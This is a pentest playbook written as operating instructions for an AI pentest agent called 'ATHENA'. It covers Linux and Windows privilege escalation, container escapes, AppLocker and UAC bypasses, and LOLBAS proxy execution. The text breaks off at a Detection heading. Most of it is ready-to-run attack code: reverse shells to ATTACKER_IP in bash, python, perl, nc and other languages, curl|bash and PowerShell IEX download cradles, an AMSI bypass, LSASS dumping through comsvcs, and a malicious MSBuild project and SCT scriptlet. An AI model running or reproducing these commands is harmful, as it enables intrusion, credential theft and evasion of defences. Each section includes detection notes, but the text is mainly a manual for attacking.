# ATHENA Pentest Playbook: Living Off the Land & Privilege Escalation

**Version:** 1.0.0
**Date:** 2026-02-26
**Classification:** CONFIDENTIAL — Internal Use Only (napoleontek / ZeroK Labs)
**Sources:** GTFOBins, LOLBAS, LOLApps, LOLDrivers, HackTricks, Praetorian Research
**Purpose:** Structured playbooks for ATHENA AI pentest agent — LOTL techniques and privilege escalation across platforms

---

## LOTL Decision Tree (Agent Routing)

Use this tree to select the correct playbook section for the target environment:

```
TARGET SYSTEM ASSESSMENT
│
├── LINUX / UNIX HOST?
│   ├── Restricted shell? → Part 1 Section 7 (GTFOBins shell escapes)
│   ├── Low-priv user? → Part 1 Sections 1-5 (PrivEsc)
│   ├── Docker environment? → Part 1 Section 6 (Container Escapes)
│   └── Need C2 callback? → Part 1 Section 7 (Reverse Shells)
│
├── WINDOWS STANDALONE?
│   ├── AppLocker / WDAC enabled? → Part 2 Section 1 (AWL Bypass)
│   ├── UAC blocking you? → Part 2 Section 2 (UAC Bypass)
│   ├── Need payload delivery? → Part 2 Section 3 (Download Cradles)
│   ├── Need proxy execution? → Part 2 Section 4 (Proxy Execution)
│   ├── Need credentials? → Part 2 Section 5 (Credential Access)
│   ├── Need domain hash dump? → Part 2 Section 6 (NTDS Extraction)
│   └── Need persistence? → Part 2 Section 7 (Persistence)
│
├── WINDOWS + ACTIVE DIRECTORY?
│   ├── No creds at all → ASREPRoast, LLMNR poisoning first
│   ├── Low-priv domain user → BloodHound + Kerberoast + ACL abuse
│   ├── Local admin → Part 4 BYOVD (kill EDR) then Part 2
│   └── Domain Admin achieved → DCSync + Golden Ticket (HackTricks AD)
│
├── APPLICATIONS ON TARGET?
│   ├── Browsers installed? → Part 3 Section 1 (Browser Creds)
│   ├── SSH clients? → Part 3 Section 2 (SSH Config Theft)
│   ├── Slack / Teams / Discord? → Part 3 Section 3 (Token Extraction)
│   └── RDP saved sessions? → Part 3 Section 4 (RDP Cache)
│
├── EDR BLOCKING OPERATIONS?
│   └── Part 4 BYOVD (LOLDrivers) — kernel-level EDR termination
│
└── CLOUD ENVIRONMENT?
    ├── Azure VM / managed identity? → Part 5 Section 1 (Azure IMDS)
    ├── AWS IAM + MFA enforced? → Part 5 Section 2 (IAM Role Chaining)
    └── GCP with metadata access? → Part 5 Section 3 (GCP SA Abuse)
```

---

## Part 1: Linux Privilege Escalation (GTFOBins)

### Overview

GTFOBins documents Unix/Linux binaries that have legitimate functionality abusable in misconfigured systems. These are NOT exploits — they are features. The power lies in cross-referencing what binaries are present against what privileges they carry (SUID bit, sudo rule, or capability). ATHENA should query GTFOBins programmatically during post-exploitation using the JSON index at `https://gtfobins.github.io/index.json` or via `gtfobins-cli` (pip).

---

### Section 1.1 — SUID Binary Abuse

**Objective:** Escalate from low-privilege user to root by abusing SUID-bit binaries that invoke a shell or execute commands as root.

**Prerequisites:**
- Shell access as any non-root user
- Target binary must have SUID bit set (`-rwsr-xr-x`)

**Procedure:**

Step 1 — Enumerate all SUID binaries on the system:
```bash
find / -perm -4000 -type f 2>/dev/null
```

Step 2 — Also check SGID binaries (group-level escalation):
```bash
find / -perm -2000 -type f 2>/dev/null
```

Step 3 — Cross-reference results against GTFOBins. Priority targets:

**python / python3 SUID:**
```bash
/usr/bin/python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

**bash SUID** (the `-p` flag preserves effective UID):
```bash
/bin/bash -p
```

**find SUID:**
```bash
/usr/bin/find . -exec /bin/sh -p \; -quit
```

**vim / vi SUID:**
```bash
/usr/bin/vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
# Or via :shell command
/usr/bin/vim -c ':set shell=/bin/sh' -c ':shell'
```

**awk SUID:**
```bash
/usr/bin/awk 'BEGIN {system("/bin/sh")}'
```

**nmap SUID** (version 2.02 to 5.21 only — `--interactive` mode):
```bash
/usr/bin/nmap --interactive
# Then at nmap prompt:
!sh
```

**less SUID:**
```bash
/usr/bin/less /etc/profile
# Then at pager:
!/bin/sh
```

**env SUID:**
```bash
/usr/bin/env /bin/sh -p
```

**tee SUID** (file write to add to sudoers — indirect escalation):
```bash
echo "<USERNAME> ALL=(ALL) NOPASSWD:ALL" | /usr/bin/tee -a /etc/sudoers
```

**cp SUID** (overwrite /etc/passwd to inject root-equivalent user):
```bash
# Generate password hash
openssl passwd -1 -salt <SALT> <PASSWORD>
# Create new passwd line: newroot:$1$salt$hash:0:0:root:/root:/bin/bash
echo 'newroot:$1$<SALT>$<HASH>:0:0:root:/root:/bin/bash' >> /tmp/passwd_copy
cp /etc/passwd /tmp/passwd_backup
cp /tmp/passwd_copy /etc/passwd
su newroot
```

**Detection:**
- Auditd rule: `execve` calls from SUID binaries that spawn `/bin/sh`
- AIDE/tripwire: SUID bit changes on filesystem
- EDR behavioral: child process of SUID binary with elevated UID
- Sigma rule: `proc_creation_lnx_susp_shell_from_suid`

**MITRE ATT&CK:** T1548.001 (Abuse Elevation Control Mechanism: Setuid and Setgid)

---

### Section 1.2 — Sudo Misconfigurations

**Objective:** Abuse `sudo` rules that allow running specific binaries as root without a password, or with exploitable functionality.

**Prerequisites:**
- Shell access as a user with at least one `sudo` rule
- `sudo -l` output showing `NOPASSWD` entries or known-exploitable binaries

**Procedure:**

Step 1 — Enumerate sudo rules:
```bash
sudo -l
```

Step 2 — Parse output. Look for entries in the format:
```
(root) NOPASSWD: /usr/bin/<BINARY>
(ALL)  NOPASSWD: ALL
(root) /usr/bin/<BINARY>
```

Step 3 — Exploit based on allowed binary:

**python / python3 sudo:**
```bash
sudo python3 -c 'import os; os.system("/bin/bash")'
```

**vim sudo:**
```bash
sudo vim -c ':!/bin/bash'
# Or:
sudo vim -c ':set shell=/bin/bash' -c ':shell'
```

**find sudo:**
```bash
sudo find /etc -exec /bin/sh \; -quit
```

**awk sudo:**
```bash
sudo awk 'BEGIN {system("/bin/bash")}'
```

**nmap sudo** (interactive mode):
```bash
sudo nmap --interactive
# At prompt: !sh
```

**less sudo:**
```bash
sudo less /etc/profile
# At prompt: !/bin/sh
```

**env sudo:**
```bash
sudo env /bin/sh
```

**perl sudo:**
```bash
sudo perl -e 'exec "/bin/sh";'
```

**ruby sudo:**
```bash
sudo ruby -e 'exec "/bin/sh"'
```

**lua sudo:**
```bash
sudo lua -e 'os.execute("/bin/sh")'
```

**node sudo:**
```bash
sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```

**tar sudo** (execute commands via checkpoints):
```bash
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

**zip sudo:**
```bash
sudo zip /tmp/nothing /etc/hosts -T -TT 'sh #'
```

**git sudo:**
```bash
sudo git -p help config
# At pager prompt: !/bin/sh
```

**man sudo:**
```bash
sudo man man
# At pager prompt: !/bin/sh
```

**Step 4 — SUDO with environment variable pass-through (`env_keep+=LD_PRELOAD`):**

If `sudo -l` shows `env_keep+=LD_PRELOAD`, you can preload a malicious shared library:
```bash
# Create malicious .c file
cat > /tmp/pe.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF

# Compile as shared library
gcc -fPIC -shared -o /tmp/pe.so /tmp/pe.c -nostartfiles

# Execute any allowed sudo binary with LD_PRELOAD
sudo LD_PRELOAD=/tmp/pe.so <ALLOWED_BINARY>
```

**Detection:**
- Auditd: `sudo` executions with shell commands in arguments
- Syslog: `sudo: <USER> : TTY=... COMMAND=/bin/sh`
- Behavioral: processes spawned as UID 0 from sudo session that don't match expected binary

**MITRE ATT&CK:** T1548.003 (Abuse Elevation Control Mechanism: Sudo and Sudo Caching)

---

### Section 1.3 — Capabilities Abuse

**Objective:** Abuse Linux capabilities granted to binaries that allow privilege escalation without the full SUID bit.

**Prerequisites:**
- Shell access as any non-root user
- Target binary must have specific capabilities set

**Procedure:**

Step 1 — Enumerate all files with capabilities:
```bash
getcap -r / 2>/dev/null
```

Step 2 — Identify high-value capabilities. Critical ones:

| Capability | Binary Example | Impact |
|------------|---------------|--------|
| `cap_setuid+ep` | python3, perl | Set any UID — instant root |
| `cap_net_raw+ep` | ping, tcpdump | Capture raw network traffic |
| `cap_dac_override+ep` | vim, cat | Bypass file permission checks |
| `cap_sys_ptrace+ep` | gdb, strace | Attach to processes, memory R/W |
| `cap_net_bind_service+ep` | node, python | Bind to privileged ports |

Step 3 — Exploit `cap_setuid`:

**python3 with cap_setuid:**
```bash
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**perl with cap_setuid:**
```bash
perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
```

**ruby with cap_setuid:**
```bash
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
```

Step 4 — Exploit `cap_dac_override` (read any file):
```bash
# Read shadow file
/usr/bin/vim /etc/shadow
# Then crack hashes offline with hashcat/john
```

Step 5 — Exploit `cap_sys_ptrace` (inject into root process):
```bash
# Find a root process to inject into
ps aux | grep root
# Attach with gdb and inject shellcode
gdb -p <ROOT_PID>
# At gdb prompt:
call (void)system("/bin/bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1")
```

**Detection:**
- Auditd: `cap_userns_create`, `capset` syscalls
- `getcap` enumeration (attacker recon) generates file traversal events
- Behavioral: python/perl spawning shell as UID 0 without SUID bit

**MITRE ATT&CK:** T1548.001 (Setuid and Setgid — capabilities are the modern analog)

---

### Section 1.4 — Cron Job Hijacking

**Objective:** Escalate privileges by modifying scripts or binaries executed by root-owned cron jobs, or by abusing PATH ordering in cron environments.

**Prerequisites:**
- Shell access as a low-privilege user
- Writable cron script or world-writable directory in root's PATH

**Procedure:**

Step 1 — Enumerate cron jobs:
```bash
# System-wide crontabs
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.hourly/

# Per-user crontabs
crontab -l
ls /var/spool/cron/crontabs/ 2>/dev/null

# Look for cron logs to infer jobs
grep CRON /var/log/syslog | tail -50
grep CRON /var/log/cron | tail -50
```

Step 2 — Check if cron scripts are writable:
```bash
find /etc/cron* /var/spool/cron /tmp -writable -type f 2>/dev/null
# Also check directories (if dir is writable, you can replace the script)
find /etc/cron* /var/spool/cron -writable -type d 2>/dev/null
```

Step 3 — If a root cron script is writable, inject a reverse shell or escalation:
```bash
# Append to existing writable cron script
echo "bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1" >> /path/to/writable/cron-script.sh

# Or replace the script entirely
cat > /path/to/cron-script.sh << 'EOF'
#!/bin/bash
chmod u+s /bin/bash
EOF
chmod +x /path/to/cron-script.sh
```

Step 4 — After SUID is set on /bin/bash:
```bash
/bin/bash -p
# Verify: id -> uid=1000(user) euid=0(root)
```

Step 5 — PATH abuse (if cron runs commands without full paths):

Check `/etc/crontab` for `PATH=` line and writable directories earlier in PATH:
```bash
# Example vulnerable crontab:
# PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
# * * * * * root backup_script.sh

# If /tmp is writable and in PATH, create a malicious "backup_script.sh":
cat > /tmp/backup_script.sh << 'EOF'
#!/bin/bash
chmod u+s /bin/bash
EOF
chmod +x /tmp/backup_script.sh
```

Step 6 — Check for wildcard injection in cron (tar/rsync often vulnerable):
```bash
# If cron runs: tar czf /backup/archive.tar.gz /home/user/*
# Create files named as tar flags:
touch /home/user/--checkpoint=1
touch '/home/user/--checkpoint-action=exec=sh exploit.sh'
cat > /home/user/exploit.sh << 'EOF'
chmod u+s /bin/bash
EOF
```

**Detection:**
- Auditd: writes to `/etc/cron*`, `/var/spool/cron/`, or cron script paths
- File integrity monitoring on cron directories
- Behavioral: cron spawning unexpected child processes
- Syslog: unexpected CRON executions

**MITRE ATT&CK:** T1053.003 (Scheduled Task/Job: Cron)

---

### Section 1.5 — Kernel Exploits

**Objective:** Escalate from any user to root by exploiting a vulnerable Linux kernel.

**Prerequisites:**
- Shell access as any user
- Compiler or pre-compiled exploit binary available (or accessible via wget/curl)
- Target kernel is unpatched for a known vulnerability

**Procedure:**

Step 1 — Fingerprint the kernel:
```bash
uname -a
# Output: Linux hostname 4.4.0-116-generic #140-Ubuntu SMP ...
cat /proc/version
cat /etc/os-release
```

Step 2 — Search for exploits using searchsploit:
```bash
searchsploit linux kernel <VERSION>
searchsploit linux local privilege escalation <DISTRO>
# Example:
searchsploit linux kernel 4.4.0
```

Step 3 — Cross-reference online resources:
- https://kernel-exploits.com/
- https://github.com/bwbwbwbw/linux-exploit-suggester
- https://github.com/mzet-/linux-exploit-suggester

Step 4 — Run exploit suggester directly on target:
```bash
# Download and run linux-exploit-suggester
curl -s https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash
# Or if outbound blocked, transfer and run locally:
bash linux-exploit-suggester.sh
```

Step 5 — High-value kernel CVEs (commonly unpatched):

| CVE | Kernel Range | Exploit Name | Notes |
|-----|-------------|--------------|-------|
| CVE-2021-4034 | All < 2022-01 patch | PwnKit (pkexec) | Polkit, near-universal |
| CVE-2021-3156 | sudo < 1.9.5p2 | Baron Samedit | Sudo heap overflow |
| CVE-2019-13272 | < 5.1.17 | PTRACE_TRACEME | ptrace privilege escalation |
| CVE-2016-5195 | < 4.8.3 | Dirty COW | Race condition in mmap |
| CVE-2022-0847 | 5.8-5.16.11 | Dirty Pipe | Pipe buffer overwrite |
| CVE-2023-4911 | glibc < 2.38 | Looney Tunables | LD_PRELOAD overflow |

Step 6 — Compile and run kernel exploit (PwnKit example):
```bash
# On target, check if pkexec exists
which pkexec
pkexec --version

# Download PwnKit PoC
wget https://github.com/ly4k/PwnKit/raw/main/PwnKit -O /tmp/PwnKit
chmod +x /tmp/PwnKit
/tmp/PwnKit
# Result: root shell
```

Step 7 — Dirty Pipe (CVE-2022-0847) — read-only file overwrite:
```bash
# Download exploit
wget https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-1.c -O /tmp/dirtypipe.c
gcc /tmp/dirtypipe.c -o /tmp/dirtypipe
/tmp/dirtypipe /etc/passwd
```

**Detection:**
- Unusual process creation with EUID=0 from unprivileged parent
- Known exploit binary hashes (Yara rules)
- Exploit compilation activity (gcc, make in /tmp)
- Kernel crash logs post-exploitation attempt

**MITRE ATT&CK:** T1068 (Exploitation for Privilege Escalation)

---

### Section 1.6 — Container Escapes

**Objective:** Escape a Docker or similar container to gain access to the host system with root privileges.

**Prerequisites:**
- Shell access inside a container
- Container running as root, OR privileged flag set, OR Docker socket mounted

**Procedure:**

Step 1 — Identify if you are in a container:
```bash
# Check for .dockerenv file
ls /.dockerenv

# Check cgroup info
cat /proc/1/cgroup | grep docker

# Check mounts
mount | grep -E 'overlay|docker'

# Check hostname (often random hash in Docker)
hostname
```

Step 2 — Check for common escape vectors:
```bash
# Is Docker socket mounted inside container?
ls -la /var/run/docker.sock

# Is container running as root?
id

# Is container privileged?
cat /proc/self/status | grep CapEff
# If CapEff = 0000003fffffffff (or similar full caps), container is privileged

# Check for SYS_ADMIN capability
capsh --print 2>/dev/null | grep sys_admin
```

Step 3 — Docker socket escape (most reliable):
```bash
# Verify socket is accessible
ls -la /var/run/docker.sock

# Install docker client inside container (if not present)
apt-get install -y docker.io 2>/dev/null || \
  curl -fsSL https://get.docker.com | sh 2>/dev/null

# List available images on host
docker -H unix:///var/run/docker.sock images

# Mount host filesystem into new container and chroot to it
docker -H unix:///var/run/docker.sock run -it -v /:/host ubuntu:latest chroot /host bash
# Result: root shell on HOST filesystem
```

Step 4 — Privileged container escape via cgroup notify:
```bash
# Verify privileged container
cat /proc/self/status | grep CapEff

# Mount host filesystem
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Create payload
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# Write payload to host
echo '#!/bin/sh' > /cmd
echo "ps aux > ${host_path}/output" >> /cmd
chmod a+x /cmd

# Trigger
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output
```

Step 5 — Escape via --pid=host (if container shares PID namespace):
```bash
# Check for nsenter availability
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

Step 6 — CVE-2019-5736 (runc overwrite — requires container-as-root):
```bash
# This technique overwrites the host runc binary when running as root in container
# Typically requires a pre-compiled exploit
wget https://github.com/Frichetten/CVE-2019-5736-PoC/raw/master/main.go -O /tmp/main.go
# Compile and execute (details depend on Go toolchain availability)
```

**Detection:**
- Docker daemon logs: unusual container creation, volume mounts to `/`
- Host: unexpected processes appearing from container namespaces
- EDR behavioral: chroot calls from container processes
- File integrity: `/bin/runc` modification (CVE-2019-5736)

**MITRE ATT&CK:** T1611 (Escape to Host)

---

### Section 1.7 — Reverse Shells via GTFOBins

**Objective:** Establish a reverse shell callback to the attacker's listener using a binary already present on the target.

**Prerequisites:**
- Shell access (restricted or full) on the target
- Outbound connectivity from target to attacker IP/port
- Listener running: `nc -lvnp <PORT>` on attacker machine

**Procedure:**

Set these variables first for clean one-liners:
```bash
ATTACKER_IP="<YOUR_IP>"
PORT="<YOUR_PORT>"
```

**bash reverse shell:**
```bash
bash -i >& /dev/tcp/${ATTACKER_IP}/${PORT} 0>&1
```

**python3 reverse shell:**
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'${ATTACKER_IP}'",'${PORT}'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

**nc (netcat) reverse shell** (if `-e` flag available):
```bash
nc -e /bin/bash ${ATTACKER_IP} ${PORT}
```

**nc (without -e flag / GNU netcat):**
```bash
mkfifo /tmp/f; nc ${ATTACKER_IP} ${PORT} < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

**perl reverse shell:**
```bash
perl -e 'use Socket;$i="'${ATTACKER_IP}'";$p='${PORT}';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

**ruby reverse shell:**
```bash
ruby -rsocket -e'f=TCPSocket.open("'${ATTACKER_IP}'",'${PORT}').to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

**php reverse shell:**
```bash
php -r '$sock=fsockopen("'${ATTACKER_IP}'",'${PORT}');exec("/bin/sh -i <&3 >&3 2>&3");'
```

**nodejs reverse shell:**
```bash
node -e 'var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect('${PORT}',"'${ATTACKER_IP}'",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});'
```

**awk reverse shell:**
```bash
awk 'BEGIN {s = "/inet/tcp/0/'${ATTACKER_IP}'/'${PORT}'"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

**curl reverse shell** (download and execute):
```bash
curl http://${ATTACKER_IP}:8080/shell.sh | bash
```

**wget reverse shell:**
```bash
wget -O- http://${ATTACKER_IP}:8080/shell.sh | bash
```

**Upgrade shell to fully interactive PTY (post-connection):**
```bash
# After receiving connection, on target:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z to background
stty raw -echo; fg
# Back in shell, set terminal type:
export TERM=xterm
stty rows 38 columns 116
```

**Detection:**
- Network: outbound connections from non-browser processes on non-standard ports
- Behavioral: bash launched with file descriptors pointing to network sockets
- Process: `/dev/tcp` filesystem access
- Zeek/Suricata: reverse shell protocol signatures

**MITRE ATT&CK:** T1059.004 (Command and Scripting Interpreter: Unix Shell)

---

## Part 2: Windows Privilege Escalation (LOLBAS)

### Overview

LOLBAS catalogs Microsoft-signed Windows binaries that can be abused for execution, download, UAC bypass, and credential access. These binaries are trusted by EDR and AppLocker policies by default. ATHENA should check the LOLBAS YAML files on GitHub (api0cradle/LOLBAS) for current technique data.

---

### Section 2.1 — AppLocker / WDAC Bypass

**Objective:** Execute arbitrary code on a Windows system despite Application Whitelisting (AppLocker or Windows Defender Application Control) being enforced.

**Prerequisites:**
- Shell/RDP access as a standard user
- AppLocker or WDAC policy blocking execution of arbitrary binaries

**Procedure:**

Step 1 — Identify what AppLocker allows:
```powershell
Get-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollections
# Check specifically which paths and publishers are allowed
```

Step 2 — MSBuild (Microsoft Build Engine — almost always allowed):
```powershell
# Create C:\Windows\Temp\evil.csproj
# MSBuild executes inline tasks — full .NET code execution
```

Create `C:\Windows\Temp\evil.csproj`:
```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="MSBuild">
   <MSBuildTest/>
  </Target>
   <UsingTask
    TaskName="MSBuildTest"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
            using System;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;
            public class MSBuildTest :  Task, ITask {
                public override bool Execute(){
                    System.Diagnostics.Process.Start("cmd.exe");
                    return true;
                }
            }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

Execute:
```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\Windows\Temp\evil.csproj
```

Step 3 — InstallUtil (.NET assembly execution):
```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\path\to\evil.dll
```

Step 4 — Regsvr32 (remote script execution via scrobj.dll — "Squiblydoo"):
```cmd
regsvr32.exe /s /n /u /i:http://<ATTACKER_IP>/evil.sct scrobj.dll
```

Create `evil.sct` on attacker server:
```xml
<?XML version="1.0"?>
<scriptlet>
<registration description="evil" progid="evil" version="1.00" classid="{00000001-0000-0000-0000-0000FEEDACDC}">
<script language="JScript">
<![CDATA[
  var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c whoami > C:\\Windows\\Temp\\out.txt");
]]>
</script>
</registration>
</scriptlet>
```

Step 5 — MSHTA (VBScript/JScript from URL):
```cmd
mshta.exe http://<ATTACKER_IP>/evil.hta
# Or with VBScript inline:
mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""cmd /c whoami"",0,True:close")
```

Step 6 — Rundll32 with JavaScript:
```cmd
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/shell.ps1')",0,true);
```

**Detection:**
- AppLocker audit log: EID 8003 (blocked execution), EID 8004 (user block)
- WDAC: CodeIntegrity Operational log
- Behavioral: MSBuild/InstallUtil spawning non-build child processes
- Sigma: `proc_creation_win_lolbas_msbuild`, `proc_creation_win_regsvr32_scrobj`

**MITRE ATT&CK:** T1218 (System Binary Proxy Execution), T1127 (Trusted Developer Utilities Proxy Execution)

---

### Section 2.2 — UAC Bypass

**Objective:** Elevate from medium-integrity to high-integrity (Administrator) without triggering the UAC prompt.

**Prerequisites:**
- Shell as a local administrator account (but running at medium integrity)
- Target must be running Windows 10/11 with UAC not set to "Always Notify"

**Procedure:**

Step 1 — Verify current integrity level:
```powershell
[System.Security.Principal.WindowsIdentity]::GetCurrent()
whoami /groups | findstr "Integrity Level"
```

Step 2 — fodhelper.exe UAC bypass (Windows 10+, no file needed):
```powershell
# Set registry key to inject into fodhelper's shell:open handler
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c start cmd.exe" -Force
Start-Process "C:\Windows\System32\fodhelper.exe"
# Cleanup:
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
```

Step 3 — eventvwr.exe UAC bypass (Windows 7-10):
```powershell
New-Item "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(default)" -Value "cmd /c start cmd.exe" -Force
Start-Process "C:\Windows\System32\eventvwr.exe"
# Cleanup:
Remove-Item "HKCU:\Software\Classes\mscfile\" -Recurse -Force
```

Step 4 — computerdefaults.exe UAC bypass (Windows 10):
```powershell
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value ""
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c start cmd.exe"
Start-Process "C:\Windows\System32\computerdefaults.exe"
```

Step 5 — Verify escalation succeeded:
```cmd
whoami /groups | findstr "High Mandatory Level"
```

**Detection:**
- Registry audit: HKCU Software\Classes writes for trusted binary COM handlers
- Behavioral: High-integrity cmd.exe spawned by trusted binary without UAC dialog
- Sigma: `registry_set_uac_bypass_fodhelper`, `proc_creation_win_uac_bypass_eventvwr`

**MITRE ATT&CK:** T1548.002 (Abuse Elevation Control Mechanism: Bypass User Account Control)

---

### Section 2.3 — Download Cradles

**Objective:** Download payloads from attacker-controlled infrastructure using trusted Windows binaries, bypassing egress controls that block unknown executables.

**Prerequisites:**
- Shell access (any integrity level)
- Outbound HTTP/HTTPS from target to attacker server
- Attacker HTTP server running: `python3 -m http.server 8080`

**Procedure:**

**certutil.exe (base64 download + decode):**
```cmd
certutil.exe -urlcache -split -f http://<ATTACKER_IP>/payload.exe C:\Windows\Temp\payload.exe
# Or base64 encoded:
certutil.exe -urlcache -split -f http://<ATTACKER_IP>/payload.b64 C:\Windows\Temp\payload.b64
certutil.exe -decode C:\Windows\Temp\payload.b64 C:\Windows\Temp\payload.exe
```

**bitsadmin.exe (BITS job — runs asynchronously):**
```cmd
bitsadmin /transfer EvilJob /download /priority high http://<ATTACKER_IP>/payload.exe C:\Windows\Temp\payload.exe
```

**PowerShell (multiple methods):**
```powershell
# Method 1 - WebClient DownloadFile:
(New-Object Net.WebClient).DownloadFile('http://<ATTACKER_IP>/payload.exe', 'C:\Windows\Temp\payload.exe')

# Method 2 - IEX in-memory execution (no disk write):
IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/shell.ps1')

# Method 3 - Invoke-WebRequest:
Invoke-WebRequest -Uri http://<ATTACKER_IP>/payload.exe -OutFile C:\Windows\Temp\payload.exe

# Method 4 - Bypass AMSI before download:
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/shell.ps1')
```

**curl.exe (available Windows 10 1803+):**
```cmd
curl.exe -o C:\Windows\Temp\payload.exe http://<ATTACKER_IP>/payload.exe
```

**excel.exe / Word (macro download — for initial access phase):**
```vba
' In macro:
Dim oHTTP As Object
Set oHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
oHTTP.Open "GET", "http://<ATTACKER_IP>/payload.exe", False
oHTTP.Send
```

**Detection:**
- Network: certutil / bitsadmin outbound HTTP (EDR network telemetry)
- Process: certutil with `-urlcache` flag
- Sigma: `proc_creation_win_certutil_download`, `proc_creation_win_bitsadmin_download`
- Web proxy: outbound downloads from Windows system processes

**MITRE ATT&CK:** T1105 (Ingress Tool Transfer)

---

### Section 2.4 — Proxy Execution

**Objective:** Execute malicious payloads (DLLs, scripts, shellcode) through trusted Windows system binaries to evade application control and behavioral detection.

**Prerequisites:**
- Payload on disk (DLL, SCT file, HTA, or shellcode blob)
- Any level of shell access

**Procedure:**

**rundll32.exe — Execute DLL export:**
```cmd
rundll32.exe C:\path\to\evil.dll, EntryPointFunctionName
# Run shellcode via MiniDump:
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <LSASS_PID> C:\Windows\Temp\lsass.dmp full
```

**regsvr32.exe — Register and execute DLL (side-loads code in RegisterServer):**
```cmd
regsvr32.exe /s C:\path\to\evil.dll
# Remote SCT file:
regsvr32.exe /s /n /u /i:http://<ATTACKER_IP>/evil.sct scrobj.dll
```

**mshta.exe — Execute HTA application:**
```cmd
mshta.exe C:\Windows\Temp\evil.hta
mshta.exe "javascript:new ActiveXObject('WScript.Shell').Run('cmd /c whoami',0,true);close()"
```

**forfiles.exe — Execute command per file match:**
```cmd
forfiles /p C:\Windows\System32 /m notepad.exe /c "cmd /c calc.exe"
```

**pcalua.exe (Program Compatibility Assistant):**
```cmd
pcalua.exe -a C:\Windows\Temp\payload.exe
```

**cmstp.exe — INF file proxy execution (also UAC bypass):**
```cmd
cmstp.exe /ni /s C:\Windows\Temp\evil.inf
```

Create `evil.inf`:
```ini
[version]
Signature=$chicago$
AdvancedINF=2.5
[DefaultInstall_SingleUser]
UnRegisterOCXs=UnRegisterOCXSection
[UnRegisterOCXSection]
C:\Windows\Temp\evil.dll
```

**odbcconf.exe — DLL load via REGSVR action:**
```cmd
odbcconf.exe /a {REGSVR C:\Windows\Temp\evil.dll}
```

**Detection:**
